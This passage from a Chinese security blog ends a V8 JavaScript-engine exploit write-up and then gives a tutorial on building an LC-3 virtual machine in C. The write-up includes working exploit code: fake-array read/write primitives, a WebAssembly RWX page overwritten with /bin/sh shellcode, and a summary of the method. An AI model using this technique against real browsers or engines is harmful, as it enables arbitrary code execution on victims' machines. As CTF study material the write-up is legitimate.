class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = RAA(addressFasm+<span class="number">0x18n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> functionData = RAA(sharedInfo+<span class="number">0x8n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> instanceAddr = RAA(functionData+<span class="number">0x10n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = RAA(instanceAddr+<span class="number">0x88n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Get RWX memory : &quot;</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">        <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">        <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">        <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> - <span class="number">0x1n</span>;</span><br><span class="line">WAA(bufBackStore, memoryRWX);</span><br><span class="line">dataview.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>巩固一下 V8 pwn 的利用手段</p>
<p>根据最近复现的这两个 V8 pwn 和之前遇到过的 JavaScript pwn，总结一下这种 JavaScript 引擎题目的解决思路：</p>
<ul>
<li>先分析 patch，了解大概的漏洞点</li>
<li>然后想方设法实现 <code>addressOf</code> <code>RAA</code> <code>WAA</code> 这3个函数</li>
<li>最后尝试泄露或者注入 shellcode</li>
</ul>
<p>如果可以接触到 JS 对象的 <code>map</code>，那就要考虑使用类型混淆</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">VM虚拟机技术简析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-05 01:11:51" itemprop="dateCreated datePublished" datetime="2022-12-05T01:11:51+08:00">2022-12-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-06 02:27:22" itemprop="dateModified" datetime="2022-12-06T02:27:22+08:00">2022-12-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>基础知识</strong></p>
<p>虚拟机是一种类似于计算机的程序。它模拟CPU和其他一些硬件组件，允许它执行算术，读写内存，并与I/O设备交互，就像物理计算机一样</p>
<p>虚拟机的核心功能是：理解一种可以用来编程的机器语言</p>
<ul>
<li>编译器可以通过将标准高级语言编译为多个 CPU 体系结构来解决类似的问题</li>
<li>VM 创建一个标准 CPU 体系结构，该体系结构在各种硬件设备上进行模拟</li>
<li>编译器的一个优点是它没有运行时开销，而 VM 有</li>
<li>尽管编译器做得很好，但编写面向多个平台的新编译器非常困难，因此 VM 在这里仍然很有帮助（实际上，VM 和编译器在不同级别混合使用）</li>
</ul>
<p>虚拟机的其他运用：</p>
<ul>
<li>垃圾收集：在 C 或 C++ 之上实现自动垃圾回收没有简单的方法，因为程序看不到自己的堆栈或变量，但是虚拟机位于其正在运行的程序的“外部”，可以观察堆栈上的所有内存引用</li>
<li>安全隔离：智能合约是由区块链网络中的每个验证节点执行的小程序，这要求节点操作员在他们的机器上运行由完全陌生的程序，为了防止合约执行恶意操作，所有合约都在无法访问文件系统、网络、磁盘等的VM中运行 </li>
</ul>
<p>在真实机器中，二进制代码是由具体的硬件来执行的，而虚拟机则是用其他语言模拟了这个过程，使该二进制代码可以在虚拟机的控制下执行</p>
<p><strong>LC-3架构</strong></p>
<p>LC-3 与 x86 相比，它具有简化的指令集，但包含现代 CPU 中使用的所有主要思想</p>
<ul>
<li>LC-3 有 65536 个内存位置（可由16位无符号整数寻址的最大位置），每个位置存储一个16位值，这意味着它总共只能存储128KB </li>
<li>LC-3 总共有10个寄存器，每个寄存器为16位：<ul>
<li>8个通用寄存器 -  R0 - R7</li>
<li>1个程序计数器 - PC</li>
<li>1个条件标志寄存器 - COND</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    R_R0 = <span class="number">0</span>,</span><br><span class="line">    R_R1,</span><br><span class="line">    R_R2,</span><br><span class="line">    R_R3,</span><br><span class="line">    R_R4,</span><br><span class="line">    R_R5,</span><br><span class="line">    R_R6,</span><br><span class="line">    R_R7,</span><br><span class="line">    R_PC, <span class="comment">/* program counter */</span></span><br><span class="line">    R_COND,</span><br><span class="line">    R_COUNT</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> reg[R_COUNT];</span><br></pre></td></tr></table></figure>
<ul>
<li>LC-3 中只有16个操作码，计算机可以计算的所有内容都是这些简单指令的某个序列，每条指令的长度为16位，剩下的4位存储操作码，其余位用于存储参数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    OP_BR = <span class="number">0</span>, <span class="comment">/* branch */</span></span><br><span class="line">    OP_ADD,    <span class="comment">/* add  */</span></span><br><span class="line">    OP_LD,     <span class="comment">/* load */</span></span><br><span class="line">    OP_ST,     <span class="comment">/* store */</span></span><br><span class="line">    OP_JSR,    <span class="comment">/* jump register */</span></span><br><span class="line">    OP_AND,    <span class="comment">/* bitwise and */</span></span><br><span class="line">    OP_LDR,    <span class="comment">/* load register */</span></span><br><span class="line">    OP_STR,    <span class="comment">/* store register */</span></span><br><span class="line">    OP_RTI,    <span class="comment">/* unused */</span></span><br><span class="line">    OP_NOT,    <span class="comment">/* bitwise not */</span></span><br><span class="line">    OP_LDI,    <span class="comment">/* load indirect */</span></span><br><span class="line">    OP_STI,    <span class="comment">/* store indirect */</span></span><br><span class="line">    OP_JMP,    <span class="comment">/* jump */</span></span><br><span class="line">    OP_RES,    <span class="comment">/* reserved (unused) */</span></span><br><span class="line">    OP_LEA,    <span class="comment">/* load effective address */</span></span><br><span class="line">    OP_TRAP    <span class="comment">/* execute trap */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>LC-3 仅使用3个条件标志，用于指示先前计算的符号</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FL_POS = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, <span class="comment">/* P */</span></span><br><span class="line">    FL_ZRO = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">/* Z */</span></span><br><span class="line">    FL_NEG = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">/* N */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Assembly examples 装配示例</strong></p>
<p>现在，让我们看一个 LC-3 汇编程序，以了解 VM 实际运行的内容，您不需要知道如何对装配进行编程或了解正在发生的一切，只是试着大致了解正在发生的事情：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.ORIG x3000                        ; 这是内存中将加载程序的地址</span><br><span class="line">LEA R0, HELLO_STR                  ; 将HELLO_STR字符串的地址加载到R0中</span><br><span class="line">PUTs                               ; 将R0指向的字符串输出到控制台</span><br><span class="line">HALT                               ; 停止程序</span><br><span class="line">HELLO_STR .STRINGZ &quot;Hello World!&quot;  ; 将此字符串存储在程序中</span><br><span class="line">.END                               ; 标记文件末尾</span><br></pre></td></tr></table></figure>
<ul>
<li>程序从顶部开始，一次执行一个语句</li>
</ul>
<p>请注意，某些语句的名称与我们之前定义的操作码匹配，之前，我们了解到每条指令都是16位，但每行看起来都是不同数量的字符</p>
<ul>
<li>这是因为我们正在阅读的代码是用汇编编写的，汇编是人类可读和可写的形式，以纯文本编码</li>
<li>称为汇编器的工具用于将每行文本转换为 VM 可以理解的16位二进制指令</li>
<li>这种二进制形式本质上是一个16位指令数组，称为机器代码，是 VM 实际运行的内容</li>
</ul>
<img src="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/1670154898586.png" class width="1670154898586"> 
<p><strong>Executing programs 程序执行</strong></p>
<p>虚拟机执行的流程为：</p>
<ol>
<li>从 PC 寄存器地址的内存中加载一条指令</li>
<li>递增 PC 寄存器</li>
<li>查看操作码以确定它应该执行哪种类型的指令</li>
<li>使用指令中的参数执行指令</li>
<li>返回到第一步</li>
</ol>
<p>main 函数整体的构建为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @&#123;Load Arguments&#125;</span><br><span class="line">    @&#123;Setup&#125;</span><br><span class="line">    </span><br><span class="line">    reg[R_COND] = FL_ZRO;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> PC_START = <span class="number">0x3000</span> &#125;;</span><br><span class="line">    reg[R_PC] = PC_START;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> running = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (running)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> instr = mem_read(reg[R_PC]++);</span><br><span class="line">        <span class="keyword">uint16_t</span> op = instr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> OP_ADD:</span><br><span class="line">                @&#123;ADD&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_AND:</span><br><span class="line">                @&#123;AND&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_NOT:</span><br><span class="line">                @&#123;NOT&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_BR:</span><br><span class="line">                @&#123;BR&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JMP:</span><br><span class="line">                @&#123;JMP&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JSR:</span><br><span class="line">                @&#123;JSR&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LD:</span><br><span class="line">                @&#123;LD&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDI:</span><br><span class="line">                @&#123;LDI&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDR:</span><br><span class="line">                @&#123;LDR&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LEA:</span><br><span class="line">                @&#123;LEA&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_ST:</span><br><span class="line">                @&#123;ST&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STI:</span><br><span class="line">                @&#123;STI&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STR:</span><br><span class="line">                @&#123;STR&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_TRAP:</span><br><span class="line">                @&#123;TRAP&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_RES:</span><br><span class="line">            <span class="keyword">case</span> OP_RTI:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                @&#123;BAD OPCODE&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @&#123;Shutdown&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先读取传入 VM 的参数（一个文件的路径）</li>
<li>打开这个文件，并把里面的指定数据传输到 VM 私有内存</li>
<li>设置好 PC 寄存器，然后在循环中分析并执行二进制代码</li>
<li>执行完毕后退出</li>
</ul>
<p>指令 ADD：</p>
<ul>
<li>指令 ADD 需要两个数字，将它们相加，并将结果存储在寄存器 DR 中 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0001</span>][DR][SR1][<span class="number">0</span>][<span class="number">00</span>][SR2]</span><br><span class="line">[<span class="number">0001</span>][DR][SR1][<span class="number">1</span>][imm5]</span><br></pre></td></tr></table></figure>
<ul>
<li>前4位为指令编码，接下来的3位表示目标寄存器 DR，接下来的3位表示存储有目标数据的寄存器 SR1，接下来1位用于指明“模式”类型（即时模式 / 寄存器模式），最后5位可以代表 SR2 寄存器也可以代表 imm5 立即数</li>
<li>编码显示两行，因为 ADD 指令有两种不同的“模式”：<ul>
<li>寄存器模式：把 SR1 和 SR2 中的数据相加然后存储到 DR 中</li>
<li>即时模式：把 SR1 中的数据与 imm5 相加然后存储到 DR 中</li>
</ul>
</li>
<li>符号扩展：ADD 即时模式 imm5 值只有5位，但需要将其添加到16位数字中<ul>
<li>对于正数，用“0”填充额外的位（强制类型转换即可）</li>
<li>对于负数，用“1”填充额外的位 </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">sign_extend</span><span class="params">(<span class="keyword">uint16_t</span> x, <span class="keyword">int</span> bit_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((x &gt;&gt; (bit_count - <span class="number">1</span>)) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        x |= (<span class="number">0xFFFF</span> &lt;&lt; bit_count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>每当将值写入寄存器时，我们都需要更新标志以指示其符号：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_flags</span><span class="params">(<span class="keyword">uint16_t</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg[r] == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_ZRO; <span class="comment">/* 零 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reg[r] &gt;&gt; <span class="number">15</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_NEG; <span class="comment">/* 负 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_POS; <span class="comment">/* 正 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 ADD 的代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (imm_flag) <span class="comment">/* 即时模式 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1F</span>, <span class="number">5</span>);</span><br><span class="line">    reg[r0] = reg[r1] + imm5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* 寄存器模式 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">    reg[r0] = reg[r1] + reg[r2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update_flags(r0);</span><br></pre></td></tr></table></figure>
<p>指令 LDI：</p>
<ul>
<li>LDI 代表“间接加载”，此指令用于将值从内存中的某个位置加载到寄存器中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1010</span>][DR][PCoffset9]</span><br></pre></td></tr></table></figure>
<ul>
<li>前4位为指令编码，接下来的3位表示目标寄存器 DR，最后9位代表偏移地址，它告诉我们从何处加载<ul>
<li>目标地址 = 偏移地址 + PC寄存器的值</li>
</ul>
</li>
<li>指令 LDI 的代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">reg[r0] = mem_read(mem_read(reg[R_PC] + pc_offset)); </span><br><span class="line">update_flags(r0);</span><br></pre></td></tr></table></figure>
<p>接下来的大部分指令都是基于以上这两种格式，具体实现过程就省略了</p>
<p><strong>Trap routines 陷阱例程</strong></p>
<p>LC-3 提供了一些预定义的例程用于执行常见任务和与 I/O 设备交互，这些被称为陷阱例程，可以将其视为 LC-3 的操作系统或API</p>
<p>每个陷阱例程都被分配一个陷阱代码 <code>trap code</code> 来标识它（类似于操作码），如果想要执行一个陷阱，则需要使用所需例程的陷阱代码来调用 TRAP 指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1111</span>][<span class="number">0000</span>][trapvect8]</span><br></pre></td></tr></table></figure>
<ul>
<li>前4位为指令编码 <code>[1111]</code>，接下来的4位固定为 <code>[0000]</code>，最后8位代表陷阱代码 <code>trap code</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TRAP_GETC = <span class="number">0x20</span>,  <span class="comment">/* 从键盘获取字符,不回显到终端上 */</span></span><br><span class="line">    TRAP_OUT = <span class="number">0x21</span>,   <span class="comment">/* 输出字符 */</span></span><br><span class="line">    TRAP_PUTS = <span class="number">0x22</span>,  <span class="comment">/* 输出一字大小的字符串 */</span></span><br><span class="line">    TRAP_IN = <span class="number">0x23</span>,    <span class="comment">/* 从键盘获取字符，回显到终端上 */</span></span><br><span class="line">    TRAP_PUTSP = <span class="number">0x24</span>, <span class="comment">/* 输出一字节大小的字符串 */</span></span><br><span class="line">    TRAP_HALT = <span class="number">0x25</span>   <span class="comment">/* 停止程序 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在官方的 LC-3 模拟器中，陷阱例程是用汇编编写的，调用陷阱代码时，会将 PC 寄存器移动到该代码的地址，CPU 执行陷阱例程的指令，完成后，PC 将重置到初始调用后的位置</p>
<ul>
